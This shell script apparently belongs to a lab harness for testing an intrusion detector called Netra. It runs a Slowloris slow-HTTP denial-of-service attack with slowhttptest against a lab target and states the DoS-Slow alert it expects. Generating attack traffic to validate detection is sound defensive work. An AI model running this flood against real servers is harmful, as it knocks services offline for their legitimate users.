#!/bin/sh
# Slow HTTP (Slowloris) attack with slowhttptest. Opens many connections and
# dribbles out partial HTTP headers, holding each connection open with almost
# no traffic, to exhaust the server's connection pool.
# Netra should raise a DoS-Slow alert (signature rule: more than 50 long-held,
# nearly silent connections from one source), then block the source.
#
# Usage: sh slowloris.sh [victim_ip] [port] [connections] [duration_seconds]
set -u

SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
. "$SCRIPT_DIR/_lib.sh"

TARGET="${1:-$VICTIM_DEFAULT}"
PORT="${2:-80}"
CONNS="${3:-200}"
DURATION="${4:-60}"
require_lab_target "$TARGET"

banner "Slow HTTP  ->  http://$TARGET:$PORT/   ($CONNS connections, ${DURATION}s)"
echo "Expected Netra alert: DoS-Slow, then the source is blocked."
echo

# -H slowloris (slow headers) mode, -c connections, -r connection rate/s,
# -i seconds between follow-up header lines, -x max follow-up length,
# -p timeout treated as the server being down, -l total test length.
# No -g so nothing is written to the read-only /attacks mount.
slowhttptest -H -c "$CONNS" -r 200 -i 10 -x 24 -p 3 -t GET \
    -u "http://$TARGET:$PORT/" -l "$DURATION" || true

echo
echo "Slow HTTP attack finished."
